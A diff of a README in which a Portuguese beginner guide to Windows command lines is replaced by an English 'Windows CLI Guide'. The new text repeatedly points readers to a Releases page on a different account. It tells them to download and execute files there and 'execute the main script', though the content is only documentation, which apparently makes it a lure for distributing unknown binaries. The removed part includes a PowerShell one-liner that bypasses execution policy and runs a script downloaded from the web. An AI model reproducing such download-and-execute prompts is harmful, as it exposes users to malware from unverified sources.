@@ -1,180 +1,169 @@
-<h1 align="center">🖥️ Guia Interativo do CMD, PowerShell e Terminais</h1>
+# Windows CLI Guide: Master CMD, PowerShell, Winget & More! 🚀
 
-<p align="center">Um repositório criado pra tornar o terminal menos assustador e mais amigável!<br>
-Comandos, scripts `.bat`, comparações entre CLIs e uns conteúdos adicionais</p>
-
----
-
-## 📌 Comandos Essenciais do CMD
-<p align="left">
-  <img src="./img/cmd-comandos.png" alt="Comandos CMD" width="300">
-</p>
-
-<details>
-<summary><strong>👀 Clique para expandir os principais comandos</strong></summary>
-
-```bash
-dir           # Lista arquivos
-mkdir         # Cria diretório
-cd ..         # Volta uma pasta
-tree          # Mostra estrutura
-type arquivo  # Lê conteúdo
-more arquivo  # Lê por páginas
-copy A B      # Copia
-rename A B    # Renomeia
-move A B      # Move
-del arquivo   # Apaga
-cls           # Limpa a tela
-systeminfo    # Info do sistema
-date          # Exibe/altera data
-find "txt" A  # Busca texto
-echo msg      # Exibe mensagem
-notepad       # Abre bloco de notas
-exit          # Fecha o terminal
-````
-
-</details>
-
+![Windows CLI Guide](https://img.shields.io/badge/Windows%20CLI%20Guide-v1.0-blue.svg)  
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen.svg)](https://github.com/alex868-max/windows-cli-guide/releases)
 
 ---
 
-## 🧪 Scripts `.BAT` — Automatize com Estilo
+## Overview
 
-```bat
+Welcome to the **Windows CLI Guide**! This repository serves as a visual guide to help you learn the essential commands for CMD, PowerShell, Winget, Chocolatey, and other terminal interfaces. Whether you're a beginner or just looking to sharpen your skills, this guide is a handy resource for navigating the command line world.
+
+---
+
+## Table of Contents
+
+1. [What is CLI?](#what-is-cli)
+2. [Getting Started](#getting-started)
+3. [Key Topics](#key-topics)
+   - [CMD](#cmd)
+   - [PowerShell](#powershell)
+   - [Winget](#winget)
+   - [Chocolatey](#chocolatey)
+   - [Batch Scripts](#batch-scripts)
+4. [Installation Instructions](#installation-instructions)
+5. [Usage Examples](#usage-examples)
+6. [Contributing](#contributing)
+7. [License](#license)
+
+---
+
+## What is CLI?
+
+CLI stands for Command Line Interface. It allows users to interact with the operating system by typing commands into a terminal. Unlike graphical user interfaces (GUIs), CLIs offer a more direct and efficient way to control your system, especially for repetitive tasks.
+
+---
+
+## Getting Started
+
+To get started with this guide, simply download the latest release from our [Releases section](https://github.com/alex868-max/windows-cli-guide/releases). Make sure to execute the downloaded files to access the full features of this guide.
+
+---
+
+## Key Topics
+
+### CMD
+
+The Command Prompt (CMD) is a built-in Windows application that allows users to execute commands. Here are some basic commands to get you started:
+
+- `dir`: Lists the files and directories in the current directory.
+- `cd`: Changes the current directory.
+- `copy`: Copies files from one location to another.
+
+### PowerShell
+
+PowerShell is a more advanced command-line shell and scripting language. It is designed for system administration and automation. Key commands include:
+
+- `Get-Process`: Displays a list of all running processes.
+- `Set-ExecutionPolicy`: Changes the user preference for the PowerShell script execution policy.
+- `Get-Service`: Retrieves the status of services on your machine.
+
+### Winget
+
+Winget is the Windows Package Manager. It allows you to install, upgrade, and manage software packages from the command line. Common commands are:
+
+- `winget install <package>`: Installs a specified package.
+- `winget upgrade`: Upgrades all installed packages.
+- `winget list`: Lists all installed packages.
+
+### Chocolatey
+
+Chocolatey is a package manager for Windows. It simplifies the installation of software. Here are some commands you can use:
+
+- `choco install <package>`: Installs a package.
+- `choco upgrade <package>`: Upgrades a specific package.
+- `choco uninstall <package>`: Uninstalls a package.
+
+### Batch Scripts
+
+Batch scripts are text files that contain a series of commands to be executed by the command line. They can automate repetitive tasks. A simple batch script might look like this:
+
+```batch
 @echo off
-set nome=Visitante
-echo Olá %nome%!
-```
-
-### Interação com usuário:
-
-```bat
-set /p usuario=Digite seu nome:
-echo Bem-vindo(a), %usuario%!
-```
-
-### Tratamento de erros:
-
-```bat
-IF %ERRORLEVEL% NEQ 0 (
-  echo Erro na execução!
-)
+echo Hello, World!
+pause
 ```
 
 ---
 
-## 🔧 Variáveis no CMD
+## Installation Instructions
 
-```bat
-set mensagem=Olá Mundo!
-echo %mensagem%
-```
-
-💡 *Use `set /p variavel=texto` para receber input do usuário.*
-
-<p align="left">
-  <img src="https://user-images.githubusercontent.com/74038190/212744275-c56a72c2-50b1-45e2-a693-d19d40357766.gif" width="250">
-</p>
+1. Visit the [Releases section](https://github.com/alex868-max/windows-cli-guide/releases) to download the latest version.
+2. Once downloaded, extract the files if they are in a compressed format.
+3. Open your terminal (CMD or PowerShell).
+4. Navigate to the directory where you extracted the files.
+5. Execute the main script to start using the guide.
 
 ---
 
-## 📦 Winget – Gerenciador de Pacotes (Windows 10+)
+## Usage Examples
 
-```bash
-winget install -e --id <nome>
-winget --info
+Here are some practical examples to help you understand how to use the commands effectively.
+
+### Example 1: Using CMD to List Files
+
+Open CMD and type:
+
+```cmd
+dir
 ```
 
----
+This command will display all files and folders in the current directory.
 
-## 🍫 Chocolatey via PowerShell
+### Example 2: Using PowerShell to Get Running Processes
 
-### Instalação:
+Open PowerShell and type:
 
 ```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force;
-iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))
+Get-Process
 ```
 
-### Exemplos:
+This will list all the processes currently running on your machine.
 
-```bash
-choco install nodejs
-choco list
-choco uninstall nome
+### Example 3: Installing Software with Winget
+
+To install a package using Winget, open your terminal and type:
+
+```cmd
+winget install 7zip
 ```
 
----
+This command will download and install 7zip on your machine.
 
-## ⚖️ Comparativo de Terminais
+### Example 4: Managing Packages with Chocolatey
 
-<table>
-  <tr>
-    <th>Terminal</th><th>Sistema</th><th>Destaques</th>
-  </tr>
-  <tr>
-    <td>🐧 Bash</td><td>Linux/macOS</td><td>Scripts leves, Unix-like</td>
-  </tr>
-  <tr>
-    <td>🪟 CMD</td><td>Windows</td><td>Simples, legado</td>
-  </tr>
-  <tr>
-    <td>⚡ PowerShell</td><td>Win/macOS/Linux</td><td>Baseado em objetos, moderno</td>
-  </tr>
-  <tr>
-    <td>🐘 Zsh</td><td>Linux/macOS</td><td>Customizável com temas</td>
-  </tr>
-  <tr>
-    <td>🌊 Fish</td><td>Linux/macOS</td><td>Sintaxe intuitiva, moderna</td>
-  </tr>
-  <tr>
-    <td>🐍 Python CLI</td><td>Todos</td><td>Scripts robustos, CLI tools</td>
-  </tr>
-</table>
+To install a software package using Chocolatey, use:
+
+```cmd
+choco install git
+```
+
+This will install Git on your system.
+
+### Example 5: Creating a Batch Script
+
+Create a new text file and save it with a `.bat` extension. Add the following commands:
+
+```batch
+@echo off
+echo Welcome to the Batch Script!
+pause
+```
+
+Run the script by double-clicking the file.
 
 ---
 
-## 🧰 Ferramentas Recomendadas
+## Contributing
 
-✅ **Para turbinar seu terminal**:
-
-* `CMDer` – Interface mais amigável pro CMD
-* `Windows Terminal` – Terminal oficial da Microsoft (com abas!)
-* `WSL` – Subsystem Linux no Windows
-* `apt` e `sudo` – Administração no WSL
+We welcome contributions to improve this guide. If you have suggestions, corrections, or additional commands to add, please fork the repository and submit a pull request. Make sure to follow the contribution guidelines.
 
 ---
 
-## 🖼️ Galeria
+## License
 
-📷 Confere os visuais na [pasta de imagens](./img)
-
-| Visual                             | Descrição                 |
-| --------------------------------- | ------------------------- |
-| <img src="./img/variaveis.png" width="300" />       | Variáveis no CMD          |
-| <img src="./img/winget.png" width="300" />          | Uso do Winget             |
-
+This project is licensed under the MIT License. See the LICENSE file for details.
 
 ---
 
-## 🤝 Contribua
-
-Gosta de mexer com CLI?
-Contribua com melhorias, correções ou novas artes!
-A galera que tá começando vai agradecer 🚀
-
----
-
-## 🌟 Curtiu?
-
-⭐ Dá uma estrela no repositório se esse conteúdo te ajudou!
-📣 Compartilha com colegas devs que querem aprender terminal sem sofrer!
-
----
-
-<div align="center">
-  <p>Conecte-se comigo:</p>
-    <a href="https://www.linkedin.com/in/cssbreno" target="_blank" rel="noopener">
-    <img src="https://user-images.githubusercontent.com/74038190/235294012-0a55e343-37ad-4b0f-924f-c8431d9d2483.gif" width="50" alt="LinkedIn"/>
-  </a>
-</div>
+Feel free to explore the various commands and examples in this guide. For further information, visit the [Releases section](https://github.com/alex868-max/windows-cli-guide/releases) to download the latest updates and features.
